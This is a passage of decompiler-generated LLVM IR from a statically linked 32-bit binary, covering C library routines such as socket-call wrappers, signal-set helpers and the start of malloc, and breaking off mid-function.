dec_label_pc_804f998:                             ; preds = %dec_label_pc_804f99d, %dec_label_pc_804f887, %dec_label_pc_804f943
  br label %dec_label_pc_804f9c2

dec_label_pc_804f99d:                             ; preds = %dec_label_pc_804f920
  %v3_804f9a0 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804f9a0, i32* %stack_var_-108, align 4
  %v1_804f9a4 = call i32 @free(i32 %v3_804f9a0)
  store i32 1, i32* %v1_804f6f9, align 4
  store i32 2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f998

dec_label_pc_804f9bd:                             ; preds = %dec_label_pc_804f767, %dec_label_pc_804f74b, %dec_label_pc_804f73f, %dec_label_pc_804f72c, %dec_label_pc_804f720
  store i32 34, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804f9c2

dec_label_pc_804f9c2:                             ; preds = %dec_label_pc_804f70c, %dec_label_pc_804f705, %dec_label_pc_804f6c1, %entry, %dec_label_pc_804f998, %dec_label_pc_804f85a, %dec_label_pc_804f7b4, %dec_label_pc_804f9bd
  store i32 %v0_804f69b, i32* @ebx, align 4
  store i32 %v0_804f69a, i32* @esi, align 4
  store i32 %v0_804f699, i32* @edi, align 4
  store i32 %v0_804f698, i32* @ebp, align 4
  %v0_804f9c9 = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_804f9c9

; uselistorder directives
  uselistorder i32 %v2_804f7fc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_804f77d, { 1, 0, 2 }
  uselistorder i32 %v1_804f77a, { 1, 0 }
  uselistorder i32 %v1_804f767, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_804f730.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804f71b, { 4, 2, 3, 1, 0 }
  uselistorder i32 %v2_804f6f9, { 2, 0, 1, 3 }
  uselistorder i32* %v1_804f6f9, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32* %v1_804f6ab, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0, 2, 3 }
  uselistorder i32 %tmp18, { 6, 5, 0, 4, 1, 3, 2 }
  uselistorder i32* %eax.global-to-local, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29 }
  uselistorder i32 %arg6, { 2, 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804f9c2, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_804f998, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804f72c, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804f9e7 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804f9ee = call i32 @__socketcall(i32 3, i32 %v2_804f9e7)
  ret i32 %v2_804f9ee

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fa13 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fa1a = call i32 @__socketcall(i32 6, i32 %v2_804fa13)
  ret i32 %v2_804fa1a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fa4f = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fa56 = call i32 @__socketcall(i32 15, i32 %v2_804fa4f)
  ret i32 %v2_804fa56

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fa83 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fa8a = call i32 @__socketcall(i32 10, i32 %v2_804fa83)
  ret i32 %v2_804fa8a

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v2_804fab7 = ptrtoint i32* %stack_var_-16 to i32
  %v2_804fabe = call i32 @__socketcall(i32 9, i32 %v2_804fab7)
  ret i32 %v2_804fabe

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_804fafb = ptrtoint i32* %stack_var_-24 to i32
  %v2_804fb02 = call i32 @__socketcall(i32 11, i32 %v2_804fafb)
  ret i32 %v2_804fb02

; uselistorder directives
  uselistorder i32* %stack_var_-24, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-20, align 4
  %v2_804fb37 = ptrtoint i32* %stack_var_-20 to i32
  %v2_804fb3e = call i32 @__socketcall(i32 14, i32 %v2_804fb37)
  ret i32 %v2_804fb3e

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  store i32 %arg1, i32* %stack_var_-12, align 4
  %v2_804fb63 = ptrtoint i32* %stack_var_-12 to i32
  %v2_804fb6a = call i32 @__socketcall(i32 1, i32 %v2_804fb63)
  ret i32 %v2_804fb6a

; uselistorder directives
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32)* @__socketcall, { 5, 4, 6, 0, 1, 3, 7, 2 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp3 = icmp slt i32 %arg1, 1
  br i1 %tmp3, label %dec_label_pc_804fb8c, label %dec_label_pc_804fb7f

dec_label_pc_804fb7f:                             ; preds = %entry
  %v1_804fb7f = add i32 %arg1, -64
  %v3_804fb7f = sub i32 63, %arg1
  %v4_804fb7f = and i32 %v3_804fb7f, %arg1
  %v5_804fb7f = icmp slt i32 %v4_804fb7f, 0
  %v6_804fb7f = icmp eq i32 %v1_804fb7f, 0
  %v7_804fb7f = icmp slt i32 %v1_804fb7f, 0
  %v3_804fb82 = icmp eq i1 %v7_804fb7f, %v5_804fb7f
  %v4_804fb82 = icmp eq i1 %v6_804fb7f, false
  %v5_804fb82 = and i1 %v4_804fb82, %v3_804fb82
  br i1 %v5_804fb82, label %dec_label_pc_804fb8c, label %dec_label_pc_804fb84

dec_label_pc_804fb84:                             ; preds = %dec_label_pc_804fb7f
  %v4_804fb87 = call i32 @__sigaddset(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fb8c

dec_label_pc_804fb8c:                             ; preds = %dec_label_pc_804fb7f, %entry, %dec_label_pc_804fb84
  %v1_804fb8c = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_804fb91 = inttoptr i32 %v1_804fb8c to i32*
  store i32 22, i32* %v1_804fb91, align 4
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_804fb7f, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_804fb8c, { 2, 0, 1 }
}

define i32 @sigemptyset(i32 %arg1) local_unnamed_addr {
entry:
  %v3_804fbae = inttoptr i32 %arg1 to i8*
  %v4_804fbae = call i32 @__GI_memset(i8* %v3_804fbae, i32 0, i32 128)
  ret i32 0
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-300 = alloca i32, align 4
  %v0_804fbbc = load i32, i32* @ebx, align 4
  %v15_804fbbd = ptrtoint i32* %stack_var_-300 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v10_804fbd1 = icmp eq i32 %arg2, -1
  br i1 %v10_804fbd1, label %dec_label_pc_804fbdf, label %dec_label_pc_804fbd6

dec_label_pc_804fbd6:                             ; preds = %entry
  %tmp16 = icmp slt i32 %arg1, 1
  br i1 %tmp16, label %dec_label_pc_804fbdf, label %dec_label_pc_804fbda

dec_label_pc_804fbda:                             ; preds = %dec_label_pc_804fbd6
  %v7_804fbdd = icmp sgt i32 %arg1, 64
  br i1 %v7_804fbdd, label %dec_label_pc_804fbdf, label %dec_label_pc_804fbec

dec_label_pc_804fbdf:                             ; preds = %dec_label_pc_804fbda, %dec_label_pc_804fbd6, %entry
  %v1_804fbdf = call i32 @__errno_location(i32 %v0_804fbbc)
  store i32 %v1_804fbdf, i32* %eax.global-to-local, align 4
  %v1_804fbe4 = inttoptr i32 %v1_804fbdf to i32*
  store i32 22, i32* %v1_804fbe4, align 4
  br label %dec_label_pc_804fc60

dec_label_pc_804fbec:                             ; preds = %dec_label_pc_804fbda
  store i32 %arg2, i32* %stack_var_-144, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fbfa

dec_label_pc_804fbfa:                             ; preds = %dec_label_pc_804fbfa.dec_label_pc_804fbfa_crit_edge, %dec_label_pc_804fbec
  %v0_804fbfa = phi i32 [ %v15_804fbbd, %dec_label_pc_804fbec ], [ %v0_804fbfa.pre, %dec_label_pc_804fbfa.dec_label_pc_804fbfa_crit_edge ]
  %v1_804fc0517 = phi i32 [ 31, %dec_label_pc_804fbec ], [ %v1_804fc05, %dec_label_pc_804fbfa.dec_label_pc_804fbfa_crit_edge ]
  %v2_804fbfa = mul i32 %v1_804fc0517, 4
  %v3_804fbfa = add i32 %v2_804fbfa, 160
  %v4_804fbfa = add i32 %v3_804fbfa, %v0_804fbfa
  %v5_804fbfa = inttoptr i32 %v4_804fbfa to i32*
  store i32 0, i32* %v5_804fbfa, align 4
  %v0_804fc05.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804fc05 = add i32 %v0_804fc05.pre, -1
  %v9_804fc05 = icmp slt i32 %v1_804fc05, 0
  store i32 %v1_804fc05, i32* %eax.global-to-local, align 4
  %v1_804fc06 = icmp eq i1 %v9_804fc05, false
  br i1 %v1_804fc06, label %dec_label_pc_804fbfa.dec_label_pc_804fbfa_crit_edge, label %dec_label_pc_804fc08

dec_label_pc_804fbfa.dec_label_pc_804fbfa_crit_edge: ; preds = %dec_label_pc_804fbfa
  %v0_804fbfa.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804fbfa

dec_label_pc_804fc08:                             ; preds = %dec_label_pc_804fbfa
  %v0_804fc08 = load i32, i32* @edx, align 4
  %v2_804fc0b = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_804fc0b, i32* %eax.global-to-local, align 4
  %v4_804fc13 = call i32 @__sigaddset(i32 %v2_804fc0b, i32 %arg1, i32 %v0_804fc08, i32 %v0_804fc08)
  store i32 %v4_804fc13, i32* %eax.global-to-local, align 4
  %v2_804fc1b = icmp slt i32 %v4_804fc13, 0
  br i1 %v2_804fc1b, label %dec_label_pc_804fc60, label %dec_label_pc_804fc1f

dec_label_pc_804fc1f:                             ; preds = %dec_label_pc_804fc08
  %v4_804fc27 = call i32 @__sigismember(i32 ptrtoint (i32* @global_var_8060400.223 to i32), i32 %arg1, i32 %v4_804fc13, i32 %v4_804fc13)
  %v2_804fc40 = ptrtoint i32* %stack_var_-284 to i32
  %v2_804fc45 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_804fc45, i32* %eax.global-to-local, align 4
  %v4_804fc4e = call i32 @__libc_sigaction(i32 %arg1, i32* nonnull %stack_var_-144, i32 %v2_804fc40)
  store i32 %v4_804fc4e, i32* %eax.global-to-local, align 4
  %v2_804fc56 = icmp slt i32 %v4_804fc4e, 0
  br i1 %v2_804fc56, label %dec_label_pc_804fc60, label %dec_label_pc_804fc5a

dec_label_pc_804fc5a:                             ; preds = %dec_label_pc_804fc1f
  %v3_804fc5a = load i32, i32* %stack_var_-284, align 4
  br label %dec_label_pc_804fc63

dec_label_pc_804fc60:                             ; preds = %dec_label_pc_804fc1f, %dec_label_pc_804fc08, %dec_label_pc_804fbdf
  br label %dec_label_pc_804fc63

dec_label_pc_804fc63:                             ; preds = %dec_label_pc_804fc5a, %dec_label_pc_804fc60
  %storemerge = phi i32 [ -1, %dec_label_pc_804fc60 ], [ %v3_804fc5a, %dec_label_pc_804fc5a ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804fbbc, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_804fc05, { 2, 1, 0 }
  uselistorder i32* %stack_var_-144, { 0, 2, 1 }
  uselistorder i32* %eax.global-to-local, { 9, 0, 1, 2, 3, 4, 7, 8, 5, 6 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 2, 3, 1, 4, 0, 5 }
  uselistorder label %dec_label_pc_804fc63, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_804fc7a = add i32 %arg2, -1
  %v1_804fc7d = urem i32 %v1_804fc7a, 32
  %v2_804fc7d = icmp eq i32 %v1_804fc7d, 0
  %v2_804fc80 = udiv i32 %v1_804fc7a, 32
  br i1 %v2_804fc7d, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fc83 = shl i32 1, %v1_804fc7d
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fc85 = phi i32 [ 1, %entry ], [ %v5_804fc83, %bb ]
  %v2_804fc85 = mul nuw nsw i32 %v2_804fc80, 4
  %v3_804fc85 = add i32 %v2_804fc85, %arg1
  %v4_804fc85 = inttoptr i32 %v3_804fc85 to i32*
  %v5_804fc85 = load i32, i32* %v4_804fc85, align 4
  %v7_804fc85 = and i32 %v5_804fc85, %v6_804fc85
  %v8_804fc85 = icmp eq i32 %v7_804fc85, 0
  %v1_804fc89 = icmp eq i1 %v8_804fc85, false
  %v2_804fc89 = zext i1 %v1_804fc89 to i32
  ret i32 %v2_804fc89

; uselistorder directives
  uselistorder i32 %v1_804fc7d, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804fc90 = load i32, i32* @ebx, align 4
  store i32 %v0_804fc90, i32* %stack_var_-4, align 4
  %v1_804fc9e = add i32 %arg2, -1
  %v1_804fca1 = urem i32 %v1_804fc9e, 32
  %v2_804fca1 = icmp eq i32 %v1_804fca1, 0
  store i32 %v1_804fca1, i32* @ecx, align 4
  %v2_804fca4 = udiv i32 %v1_804fc9e, 32
  store i32 %v2_804fca4, i32* @edx, align 4
  br i1 %v2_804fca1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_804fca7 = shl i32 1, %v1_804fca1
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fca9 = phi i32 [ 1, %entry ], [ %v5_804fca7, %bb ]
  %v2_804fca9 = mul nuw nsw i32 %v2_804fca4, 4
  %v3_804fca9 = add i32 %v2_804fca9, %arg1
  %v4_804fca9 = inttoptr i32 %v3_804fca9 to i32*
  %v5_804fca9 = load i32, i32* %v4_804fca9, align 4
  %v7_804fca9 = or i32 %v5_804fca9, %v6_804fca9
  store i32 %v7_804fca9, i32* %v4_804fca9, align 4
  %v2_804fcae = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804fcae, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_804fca4, { 1, 0 }
  uselistorder i32 %v1_804fca1, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_804fcbe = add i32 %arg2, -1
  %v1_804fcc1 = urem i32 %v1_804fcbe, 32
  %v2_804fcc1 = icmp eq i32 %v1_804fcc1, 0
  %v2_804fcc4 = udiv i32 %v1_804fcbe, 32
  br i1 %v2_804fcc1, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_804fcc7 = shl i32 -2, %v1_804fcc1
  %v5_804fcc7 = sub nsw i32 32, %v1_804fcc1
  %v6_804fcc7 = lshr i32 -2, %v5_804fcc7
  %v7_804fcc7 = or i32 %v6_804fcc7, %v4_804fcc7
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_804fcc9 = phi i32 [ -2, %entry ], [ %v7_804fcc7, %bb ]
  %v2_804fcc9 = mul nuw nsw i32 %v2_804fcc4, 4
  %v3_804fcc9 = add i32 %v2_804fcc9, %arg1
  %v4_804fcc9 = inttoptr i32 %v3_804fcc9 to i32*
  %v5_804fcc9 = load i32, i32* %v4_804fcc9, align 4
  %v7_804fcc9 = and i32 %v5_804fcc9, %v6_804fcc9
  store i32 %v7_804fcc9, i32* %v4_804fcc9, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804fcc1, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_804fcd0 = load i32, i32* @eax, align 4
  %v6_804fce3 = icmp ugt i32 %v0_804fcd0, 16777215
  br i1 %v6_804fce3, label %dec_label_pc_804fcf4, label %dec_label_pc_804fce5

dec_label_pc_804fce5:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_804fcd0, 256
  %v2_804fcd3 = udiv i32 %v0_804fcd0, 256
  %v2_804fce5 = call i32 @llvm.ctlz.i32(i32 %v2_804fcd3, i1 true)
  %v3_804fce5 = xor i32 %v2_804fce5, 31
  %v5_804fce5 = select i1 %tmp, i32 95, i32 %v3_804fce5
  %v1_804fce8 = add nuw nsw i32 %v5_804fce5, 6
  store i32 %v1_804fce8, i32* @ecx, align 4
  %v2_804fceb = urem i32 %v1_804fce8, 32
  %v4_804fceb = icmp eq i32 %v2_804fceb, 0
  br i1 %v4_804fceb, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_804fce5
  %v5_804fceb = lshr i32 %v0_804fcd0, %v2_804fceb
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_804fce5, %bb
  %v0_804fced = phi i32 [ %v0_804fcd0, %dec_label_pc_804fce5 ], [ %v5_804fceb, %bb ]
  %v1_804fced = urem i32 %v0_804fced, 4
  %v2_804fcf0 = mul nuw nsw i32 %v5_804fce5, 4
  %v3_804fcf0 = or i32 %v1_804fced, 32
  %v4_804fcf0 = add nuw nsw i32 %v3_804fcf0, %v2_804fcf0
  br label %dec_label_pc_804fcf4

dec_label_pc_804fcf4:                             ; preds = %entry, %bb4
  %v0_804fcf5 = phi i32 [ 95, %entry ], [ %v4_804fcf0, %bb4 ]
  ret i32 %v0_804fcf5

; uselistorder directives
  uselistorder i32 %v2_804fceb, { 1, 0 }
  uselistorder i32 %v0_804fcd0, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_804fcf4, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804fcf6 = load i32, i32* @ebp, align 4
  %v0_804fcf7 = load i32, i32* @edi, align 4
  %v0_804fcf8 = load i32, i32* @esi, align 4
  %v0_804fcf9 = load i32, i32* @ebx, align 4
  store i32 %v0_804fcf9, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804fd0b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804fd0b, i32* @eax, align 4
  store i32 %v2_804fd0b, i32* %stack_var_-92, align 4
  %v2_804fd10 = call i32 @__pthread_return_void(i32 %v2_804fd0b, i32 134550911)
  store i32 %v2_804fd10, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_805a010.224 to i32), i32* %stack_var_-92, align 4
  %v1_804fd1c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a010.224 to i32))
  store i32 %v1_804fd1c, i32* %eax.global-to-local, align 4
  %v0_804fd24 = load i32, i32* %ebx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_804fd24, -32
  br i1 %tmp125, label %dec_label_pc_804fd3b, label %dec_label_pc_804fd29

dec_label_pc_804fd29:                             ; preds = %entry
  %v0_804fd29 = load i32, i32* %stack_var_-92, align 4
  %v1_804fd29 = call i32 @__errno_location(i32 %v0_804fd29)
  store i32 %v1_804fd29, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_804fd30 = inttoptr i32 %v1_804fd29 to i32*
  store i32 12, i32* %v1_804fd30, align 4
  br label %dec_label_pc_8050460

dec_label_pc_804fd3b:                             ; preds = %entry
  %v1_804fd3b = add i32 %v0_804fd24, 11
  %tmp126 = icmp ult i32 %v1_804fd3b, 16
  br i1 %tmp126, label %dec_label_pc_804fd52, label %dec_label_pc_804fd4b

dec_label_pc_804fd4b:                             ; preds = %dec_label_pc_804fd3b
  %v1_804fd4b = and i32 %v1_804fd3b, -8
  br label %dec_label_pc_804fd52

dec_label_pc_804fd52:                             ; preds = %dec_label_pc_804fd3b, %dec_label_pc_804fd4b
  %storemerge136 = phi i32 [ %v1_804fd4b, %dec_label_pc_804fd4b ], [ %v1_804fd3b, %dec_label_pc_804fd3b ]
  %v1_80500ea = phi i32 [ %v1_804fd4b, %dec_label_pc_804fd4b ], [ 16, %dec_label_pc_804fd3b ]
  store i32 %storemerge136, i32* %eax.global-to-local, align 4
  %v0_804fd52 = load i8, i8* @global_var_8060480.225, align 1
  %v1_804fd52 = sext i8 %v0_804fd52 to i32
  store i32 %v1_804fd52, i32* @ebx, align 4
  %v3_804fd58 = urem i8 %v0_804fd52, 2
  %v4_804fd58 = icmp eq i8 %v3_804fd58, 0
  %v1_804fd5b = icmp eq i1 %v4_804fd58, false
  br i1 %v1_804fd5b, label %dec_label_pc_804fd7a, label %dec_label_pc_804fd5d

dec_label_pc_804fd5d:                             ; preds = %dec_label_pc_804fd52
  %v2_804fd5d = icmp eq i8 %v0_804fd52, 0
  %v1_804fd5f = icmp eq i1 %v2_804fd5d, false
  br i1 %v1_804fd5f, label %dec_label_pc_8050055, label %dec_label_pc_804fd65

dec_label_pc_804fd65:                             ; preds = %dec_label_pc_804fd5d
  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* %stack_var_-92, align 4
  %v2_804fd6d = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060480.225 to i32*))
  store i32 %v2_804fd6d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050055

dec_label_pc_804fd7a:                             ; preds = %dec_label_pc_804fd52
  %v11_804fd7a = trunc i32 %v1_80500ea to i8
  %v8_804fd7e = icmp ugt i8 %v11_804fd7a, %v0_804fd52
  br i1 %v8_804fd7e, label %dec_label_pc_804fd9b, label %dec_label_pc_804fd80

dec_label_pc_804fd80:                             ; preds = %dec_label_pc_804fd7a
  %v2_804fd84 = udiv i32 %v1_80500ea, 2
  store i32 %v2_804fd84, i32* %eax.global-to-local, align 4
  %v1_804fd86 = add i32 %v2_804fd84, ptrtoint (i8* @global_var_8060480.225 to i32)
  store i32 %v1_804fd86, i32* @ecx, align 4
  %v1_804fd8c = add i32 %v2_804fd84, add (i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32 -4)
  %v2_804fd8c = inttoptr i32 %v1_804fd8c to i32*
  %v3_804fd8c = load i32, i32* %v2_804fd8c, align 4
  store i32 %v3_804fd8c, i32* @edx, align 4
  %v1_804fd8f = icmp eq i32 %v3_804fd8c, 0
  br i1 %v1_804fd8f, label %dec_label_pc_804fd9b, label %dec_label_pc_804fd93

dec_label_pc_804fd93:                             ; preds = %dec_label_pc_804fd80
  %v1_804fd93 = add i32 %v3_804fd8c, 8
  %v2_804fd93 = inttoptr i32 %v1_804fd93 to i32*
  %v3_804fd93 = load i32, i32* %v2_804fd93, align 4
  store i32 %v3_804fd93, i32* %eax.global-to-local, align 4
  store i32 %v3_804fd93, i32* %v2_804fd8c, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fd9b:                             ; preds = %dec_label_pc_804fd80, %dec_label_pc_804fd7a
  %v8_804fd9b = icmp ult i32 %v1_80500ea, 255
  %v6_804fda3 = icmp ugt i32 %v1_80500ea, 255
  store i32 %v1_80500ea, i32* @eax, align 4
  br i1 %v6_804fda3, label %dec_label_pc_804fddc, label %dec_label_pc_804fda5

dec_label_pc_804fda5:                             ; preds = %dec_label_pc_804fd9b
  %v2_804fda9 = udiv i32 %v1_80500ea, 8
  store i32 %v2_804fda9, i32* %eax.global-to-local, align 4
  %v1_804fdb0 = mul nuw i32 %v2_804fda9, 8
  %v2_804fdb0 = add i32 %v1_804fdb0, ptrtoint (i32* @global_var_80604ac.226 to i32)
  store i32 %v2_804fdb0, i32* @ecx, align 4
  %v1_804fdb7 = add i32 %v1_804fdb0, add (i32 ptrtoint (i32* @global_var_80604ac.226 to i32), i32 12)
  %v2_804fdb7 = inttoptr i32 %v1_804fdb7 to i32*
  %v3_804fdb7 = load i32, i32* %v2_804fdb7, align 4
  store i32 %v3_804fdb7, i32* @edx, align 4
  %v12_804fdba = icmp eq i32 %v3_804fdb7, %v2_804fdb0
  br i1 %v12_804fdba, label %dec_label_pc_804fed8.preheader, label %dec_label_pc_804fdc2

dec_label_pc_804fdc2:                             ; preds = %dec_label_pc_804fda5
  store i32 %v1_80500ea, i32* %ebx.global-to-local, align 4
  %v1_804fdc6 = add i32 %v3_804fdb7, 12
  %v2_804fdc6 = inttoptr i32 %v1_804fdc6 to i32*
  %v3_804fdc6 = load i32, i32* %v2_804fdc6, align 4
  store i32 %v3_804fdc6, i32* %eax.global-to-local, align 4
  store i32 %v3_804fdc6, i32* %v2_804fdb7, align 4
  %v0_804fdcc = load i32, i32* @edx, align 4
  %v1_804fdcc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fdcc = add i32 %v0_804fdcc, 4
  %v3_804fdcc = add i32 %v2_804fdcc, %v1_804fdcc
  %v4_804fdcc = inttoptr i32 %v3_804fdcc to i32*
  %v5_804fdcc = load i32, i32* %v4_804fdcc, align 4
  %v6_804fdcc = or i32 %v5_804fdcc, 1
  store i32 %v6_804fdcc, i32* %v4_804fdcc, align 4
  %v0_804fdd1 = load i32, i32* @ecx, align 4
  %v1_804fdd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_804fdd1 = add i32 %v1_804fdd1, 8
  %v3_804fdd1 = inttoptr i32 %v2_804fdd1 to i32*
  store i32 %v0_804fdd1, i32* %v3_804fdd1, align 4
  br label %dec_label_pc_804fdd4

dec_label_pc_804fdd4:                             ; preds = %dec_label_pc_8050171, %dec_label_pc_8050183, %dec_label_pc_804fd93, %dec_label_pc_804fdc2
  %v0_804fdd4 = load i32, i32* @edx, align 4
  %v1_804fdd4 = add i32 %v0_804fdd4, 8
  store i32 %v1_804fdd4, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805044f

dec_label_pc_804fddc:                             ; preds = %dec_label_pc_804fd9b
  %v0_804fde0 = call i32 @__malloc_largebin_index()
  store i32 %v0_804fde0, i32* %eax.global-to-local, align 4
  %v3_804fde5 = and i8 %v0_804fd52, 2
  %v4_804fde5 = icmp eq i8 %v3_804fde5, 0
  %v6_804fde5 = zext i8 %v3_804fde5 to i32
  %v9_804fde5 = and i32 %v1_804fd52, -256
  %v10_804fde5 = or i32 %v9_804fde5, %v6_804fde5
  store i32 %v10_804fde5, i32* @ebx, align 4
  br i1 %v4_804fde5, label %dec_label_pc_804fed8.preheader, label %dec_label_pc_804fdf2

dec_label_pc_804fdf2:                             ; preds = %dec_label_pc_804fddc
  store i32 ptrtoint (i8* @global_var_8060480.225 to i32), i32* %stack_var_-92, align 4
  %v2_804fdfa = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060480.225 to i32*))
  store i32 %v2_804fdfa, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fed8.preheader

dec_label_pc_804fed8.preheader:                   ; preds = %dec_label_pc_804fdf2, %dec_label_pc_804fda5, %dec_label_pc_804fddc
